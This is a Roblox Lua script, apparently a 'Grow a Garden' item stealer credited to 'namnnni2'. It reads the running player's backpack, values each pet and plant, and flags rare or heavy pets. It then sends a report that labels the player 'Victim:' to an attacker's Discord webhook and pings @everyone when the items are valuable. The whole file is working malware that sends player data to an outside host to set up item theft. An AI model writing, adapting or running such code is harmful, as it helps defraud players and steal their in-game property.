local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local dataService = require(modules:WaitForChild("DataService"))
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))

local backpack = plr:WaitForChild("Backpack")
local character = plr.Character or plr.CharacterAdded:Wait()

-- Láº¥y tá»« settings ngoÃ i
local webhook = Webhook
local users = {Username}

local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
local itemsToSend = {}
local totalValue = 0
local hasRare = false
local hasHeavy = false

local function formatNumber(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	if suffixIndex == 1 then
		return tostring(math.floor(number))
	else
		return string.format("%.2f%s", number, suffixes[suffixIndex])
	end
end

local function getWeight(tool)
	local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG")
	if weightValue then
		return tonumber(weightValue.Value) or 0
	end
	local match = tool.Name:match("%((%d+%.?%d*) ?kg%)")
	return tonumber(match) or 0
end

local function calcPetValue(petData)
	local hatchedFrom = petData.PetData.HatchedFrom
	if not hatchedFrom then return 0 end
	local eggData = petRegistry.PetEggs[hatchedFrom]
	if not eggData then return 0 end
	local rarityData = eggData.RarityData.Items[petData.PetType]
	if not rarityData then return 0 end
	local weightRange = rarityData.GeneratedPetData.WeightRange
	local ratio = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
	local scale = math.lerp(0.8, 1.2, ratio)
	local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
	local finalMultiplier = scale * math.lerp(0.15, 6, levelProgress)
	local basePrice = petRegistry.PetList[petData.PetType].SellPrice
	return math.floor(basePrice * finalMultiplier)
end

for _, tool in ipairs(backpack:GetChildren()) do
	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
		if tool:GetAttribute("ItemType") == "Pet" then
			local uuid = tool:GetAttribute("PET_UUID")
			local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
			local petName = petData.PetType
			local value = calcPetValue(petData)
			local weight = getWeight(tool)

			if table.find(rarePets, petName) then hasRare = true end
			if weight >= 10 then hasHeavy = true end

			totalValue += value
			table.insert(itemsToSend, {
				Name = petName,
				Weight = weight,
				Value = value,
				Type = "Pet"
			})
		else
			local value = calcPlantValue(tool)
			local weight = getWeight(tool)
			local itemName = tool:GetAttribute("ItemName") or tool.Name

			totalValue += value
			table.insert(itemsToSend, {
				Name = itemName,
				Weight = weight,
				Value = value,
				Type = "Plant"
			})
		end
	end
end

table.sort(itemsToSend, function(a, b)
	if a.Type == "Pet" and b.Type ~= "Pet" then
		return true
	elseif a.Type ~= "Pet" and b.Type == "Pet" then
		return false
	else
		return a.Value > b.Value
	end
end)

local contentPrefix = ""
if hasRare or hasHeavy then
	contentPrefix = "@everyone "
end

local itemLines = ""
for _, item in ipairs(itemsToSend) do
	itemLines = itemLines .. string.format("%s (%.2f KG): â‚µ%s\n", item.Name, item.Weight, formatNumber(item.Value))
end

if #itemLines > 1024 then
	itemLines = itemLines:sub(1, 1010) .. "\n...more items"
end

local data = {
	content = contentPrefix,
	embeds = {{
		title = "ðŸŽ¯ Full Inventory Report",
		color = 65280,
		fields = {
			{
				name = "Victim:",
				value = plr.Name,
				inline = true
			},
			{
				name = "Total Value:",
				value = "â‚µ" .. formatNumber(totalValue),
				inline = true
			},
			{
				name = "Item List:",
				value = itemLines
			}
		},
		footer = {
			text = "GAG Stealer by namnnni2"
		}
	}}
}

pcall(function()
	http_request({
		Url = webhook,
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = HttpService:JSONEncode(data)
	})
end)
